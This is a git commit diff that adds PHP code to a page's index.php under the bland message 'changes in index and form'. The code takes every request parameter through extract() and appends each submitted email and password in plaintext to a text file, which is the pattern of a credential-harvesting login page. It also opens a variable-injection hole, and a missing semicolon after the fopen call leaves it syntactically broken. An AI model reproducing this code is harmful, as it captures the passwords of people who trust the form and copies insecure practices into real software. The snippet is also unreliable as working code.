411f6924296c42e612d9b2bcb41939b573dbeb33
Marc Falcón Barau <65574449+barau17@users.noreply.github.com>
2022-11-16 18:03:33 +0100

    changes in index and form

--- index.php
+++ index.php
@@ -56,3 +56,16 @@ button {
     </form>   
 </body>   
 </html>
+
+<?php
+    extract($_REQUEST);
+    $file=fopen("form.txt", "a")
+
+    fwrite($file, "email :");
+    fwrite($file, $email . "\n");
+
+    fwrite($file, "password :");
+    fwrite($file, $password . "\n");
+
+    fclose($file);
+?>
